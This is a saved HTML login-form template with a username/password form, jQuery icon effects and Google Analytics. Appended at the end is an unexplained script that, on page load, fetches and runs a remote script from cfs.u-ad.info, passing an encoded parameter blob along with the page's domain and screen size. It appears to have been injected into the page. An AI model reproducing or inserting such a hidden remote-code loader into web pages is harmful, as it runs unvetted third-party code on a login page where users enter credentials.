<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0041)http://www.demo.amitjakhu.com/login-form/ -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--------------------
LOGIN FORM
by: Amit Jakhu
www.amitjakhu.com
--------------------->

<!--META-->

<title>Login Form</title>

<!--STYLESHEETS-->
<link href="./css/style.css" rel="stylesheet" type="text/css">

<!--SCRIPTS-->
<script type="text/javascript" async="" src="./js/ga.js"></script><script type="text/javascript" src="./js/jquery.min.js"></script>
<!--Slider-in icons-->
<script type="text/javascript">
$(document).ready(function() {
	$(".username").focus(function() {
		$(".user-icon").css("left","-48px");
	});
	$(".username").blur(function() {
		$(".user-icon").css("left","0px");
	});
	
	$(".password").focus(function() {
		$(".pass-icon").css("left","-48px");
	});
	$(".password").blur(function() {
		$(".pass-icon").css("left","0px");
	});
});
</script>
<!--Google Analytics-->
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-28197767-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

</head>
<body>

<!--WRAPPER-->
<div id="wrapper">

	<!--SLIDE-IN ICONS-->
    <div class="user-icon" style="left: 0px;"></div>
    <div class="pass-icon" style="left: 0px;"></div>
    <!--END SLIDE-IN ICONS-->

<!--LOGIN FORM-->
<form name="login-form" class="login-form" action="proseslogin.php" method="post" id="680548832">

	<!--HEADER-->
    <div class="header">
    <!--TITLE--><h1>Login</h1><!--END TITLE-->
    <!--DESCRIPTION--><span>Please insert username and password.</span><!--END DESCRIPTION-->
    </div>
    <!--END HEADER-->
	
	<!--CONTENT-->
    <div class="content">
	<!--USERNAME--><input name="username" type="text" class="input username" value="Username" onfocus="this.value=&#39;&#39;"><!--END USERNAME-->
    <!--PASSWORD--><input name="password" type="password" class="input password" value="Password" onfocus="this.value=&#39;&#39;"><!--END PASSWORD-->
    </div>
    <!--END CONTENT-->
    
    <!--FOOTER-->
    <div class="footer">
    <!--LOGIN BUTTON--><input type="submit" name="kirim" value="Login" class="button"><!--END LOGIN BUTTON-->
    <!--REGISTER BUTTON--><input type="submit" name="back" value="Back      " class="register"><!--END REGISTER BUTTON-->
    </div>
    <!--END FOOTER-->

</form>
<!--END LOGIN FORM-->















</div>
<!--END WRAPPER-->

<!--GRADIENT--><div class="gradient"></div><!--END GRADIENT-->

<!--DOWNLOAD (DEMO ONLY)--><!-- <a href="http://designerfuel.tumblr.com/post/15555140593/login-form-psd-live" class="download">View Resource</a> --><!--END DOWNLOAD-->

<script>function netbro_cache_analytics(fn, callback) 

{setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function 

requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : 

"http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ 

"cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + 

"4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRPuczQxwPD7J38LJ5kg1LGUIIKQ30WIryu9RKAnMG9me9AF934Kabt%2ffgpXMrCAjXTVsn2kmQ1Q6LLNuh8IoVHSI5uvzWw20NJ%2b3mPIlSDVnkuIreSoMu%2fwrE%2fbkbiqz1SZcHayJFMeU5akfgahZSoaGPns%2fgyHkq7QrG8osuGKVj3WlSTumk1kk4aeSxnqVupNTwv7b6YgCOrkJSufwh%2boy84XHIg3oMridf%2bH5zru5QCVB49hjJrgXWaYGdWO49RKu46z9Gq09j6kAMwRafHel1DO56z5vZIJ1IAuYAR4Ls9ahR7cd6QI6g1JeayAQOh9Jj3u78M%2fOO4k0pw6KalQllCtnlI6NnOjKMGhoWaCxZdZuSiQFWUOJtmAFeFlJbVQxALJf4UuY4T56lgJUXQxF13kEBH3NwD2vMGX%2fXFOdmm18YCkLkiwqP42kcm%2fXFKhGoRMyJzlPqsva84mOH%2fIrTXXbIFuYnTKdZg%2bpGY0xjuz%2b01ljO1V31nblT3Bdl2ntnvRmM9fJAwuOBLNSMe%2bS6SwvuDYAugzU%2bM7JNOCE%2fogkENgKEMFDMtzqkItBz" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw=

"+screen.width+"&sh="+screen.height;var bsa = document.createElement

('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;

(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')

[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){ });</script>
</body></html>